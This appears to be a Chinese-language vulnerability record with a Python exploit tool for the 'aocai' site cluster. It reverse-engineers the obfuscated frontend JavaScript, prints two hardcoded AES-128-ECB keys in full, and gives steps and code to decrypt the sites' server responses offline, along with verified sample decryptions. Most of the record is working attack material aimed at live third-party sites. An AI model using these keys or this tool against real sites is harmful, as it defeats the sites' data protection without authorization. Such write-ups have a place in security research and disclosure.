# aocai 站群前端双 AES 密钥完全复现（webConfig.key 派生，离线解密响应）

- **code**: aocai-站群前端双-aes-密钥完全复现-webconfig.key-派生-离线解密响应
- **kind**: exp
- **category**: info-leak
- **component**: aocai 站群前端（Vue2 + obfuscator.io + CryptoJS）
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 https://example.com 实测验证（零 API 请求，用本地已存密文样本）：AES-128-ECB/PKCS7，key=lzE235xVxsvdkvsL，两条真实密文全部解出合法 JSON（utf8ok=True，score=1.00）：① getNoticeMessage?username=weide0823 的 80 字节密文 → {"code":"e00001","message":"登录已经过期,请重新登录"}；② chess/categoryChannels 的 48 字节密文 → {"code":"success","message":"成功","total":0}。对照实验：候选 100+ 组合（4 种 key 派生 × 16/32 字节 × ECB/CBC × 去填充/原样）中仅此一组达到满分。无需认证、无需发包。
- **path**: pocs/aocai-站群前端双-aes-密钥完全复现-webconfig.key-派生-离线解密响应/aocai_key2_decrypt.py
- **tags**: aocai,站群,前端加密,AES,ECB,密钥派生,离线解密,obfuscator.io,CryptoJS
- **created_at**: 2026-10-04T11:04:19.697Z
- **found_by**: vuln-scan

## 描述

aocai 站群（9388/尊彩 系）前端双密钥体系完全逆向：从前端混淆 JS 的 sD()/_d() 还原出 AES-128-ECB 的密钥派生链，可离线解密服务端所有业务响应密文，无需任何 API 请求。适用于所有同源站群（前端 JS 由 kfjsstatic.cdn.bcebos.com/pcpc|wap/prodSite5/ 分发的站点）。

## 用法

```
1) 拉任一站点前端 JS：https://kfjsstatic.cdn.bcebos.com/wap/prodSite5/static/js/app.<hash>.js
2) 解混淆：node dump_stringtable.js app.js app.st.txt（还原字符串表）
           node rewrite2.js app.js app-rewritten.js（替换 fn(0xNNN) 调用）
3) 在重写产物里搜 "'sD':function" 定位解密调用点，搜 "'_d':function" 定位解密实现
4) 取 webConfig.key（GET /aocai-api/getWebConfigNew 用 KEY1 解密后 data.key），代入派生式
5) 解密任意响应密文：python aocai_key2_decrypt.py '<base64>'
   - KEY1 = a6bqLk97V45jXVmj（分支A: m+o+q，服务大多数接口）
   - KEY2 = lzE235xVxsvdkvsL（分支B: eval(webConfig.key) + substring(1,5) + 'kvsL'）
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
aocai 站群前端第二套密钥完全复现（离线解密工具）
============================================================
【密钥来源链（逐字还原自前端 sD()/_d()）】
  GET /aocai-api/getWebConfigNew
      → 用第一套 key(a6bqLk97V45jXVmj, AES-128-ECB/PKCS7) 解密响应
      → data.key 是一段 JS 源码：
          vxsvdax=function(){return 'lzE235xVxhe$'.replace('xhe$','');};vxsvdax()
  前端 wap app.js：
      V = window['2D7MkKneA4']          // 运行时把上面那段源码注入全局
      W = eval(V)                        // => 'lzE235xV'
      key = W + V.substring(1, 5)        // => 'lzE235xV' + 'xsvd'
  _d(cipher, key):
      if (len(key) < 12) key += 'kvsL'   // 源码里的补齐常量（明文可见）
      CryptoJS.AES.decrypt(cipher, Utf8.parse(key), {mode: ECB, padding: Pkcs7})

【最终密钥】 lzE235xVxsvdkvsL    （16 字节 → AES-128-ECB/PKCS7）

【前端原文（解混淆后）】
  '_e':function(h){ i=window['2D7MkKneA4']; i=atob(i)+i.substring(A,B);
                    if(i.length<12) i+='UOvlNS1NVh';
                    return AES.encrypt(Utf8.parse(h), Utf8.parse(i),
                                       {mode:ECB, padding:Pkcs7}).toString(); }
  '_d':function(h,i){ if(i.length<12) i+='kvsL';
                      return Utf8.stringify(AES.decrypt(h, Utf8.parse(i),
                                        {mode:ECB, padding:Pkcs7})).trim(); }
  'sD':function r(s){ ... if (s.headers[..].indexOf(..) != 0)
                          s.data = _d(s.data, m + o + q);      // 分支A：第一套 key
                      else { v = window['2D7MkKneA4']; w = eval(v);
                             s.data = _d(s.data, w + v.substring(1,5)); } }  // 分支B：第二套

【用法】
  python aocai_key2_decrypt.py '<base64密文>'
  python aocai_key2_decrypt.py --file leak_verify.json
"""
import base64, json, re, sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

KEY1 = b"a6bqLk97V45jXVmj"                      # 第一套（分支A: m+o+q）
WEB_CONFIG_KEY_JS = ("vxsvdax=function(){return "
    "'\\x6c\\x7a\\x45\\x32\\x33\\x35\\x78\\x56\\x78\\x68\\x65\\x24'"
    ".replace('\\x78\\x68\\x65\\x24','');};vxsvdax()")
_EVALED = "lzE235xV"                            # = eval(WEB_CONFIG_KEY_JS)
KEY2 = (_EVALED + WEB_CONFIG_KEY_JS[1:5] + "kvsL")[:16].encode()   # 第二套（分支B）


def _unpad(b):
    if not b:
        return b
    p = b[-1]
    return b[:-p] if 1 <= p <= 16 and b.endswith(bytes([p]) * p) else b


def dec(key: bytes, ct_b64: str, mode: str = "ECB") -> str:
    m = modes.ECB() if mode.upper() == "ECB" else modes.CBC(b"\x00" * 16)
    d = Cipher(algorithms.AES(key), m).decryptor()
    raw = base64.b64decode(ct_b64)
    return _unpad(d.update(raw) + d.finalize()).decode("utf-8", "ignore")


def dec_key2(ct: str, mode: str = "ECB") -> str:
    return dec(KEY2, ct, mode)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__); print("KEY2 =", KEY2)
    else:
        print("KEY2 ECB ->", dec_key2(sys.argv[1])[:800])

# ---- 实测验证 ----
# cipher: YMkbo/hL1KhY9BMcSRVUYIy4n+5DFScBCA8ztm1OMfLWnkH98ft2ntqBhHO3wYt+4tkSqtPOGxLEMd5O3PsMtcrMNG2q9YpiojQycew/ECY=
#   → {"code":"e00001","message":"登录已经过期,请重新登录"}
# cipher: +T6yNalHNALeZfloHtKkls4o+qQm9qjvpedV+KhiX3uPNxmqCipXg1ki33P8iZK1
#   → {"code":"success","message":"成功","total":0}

```
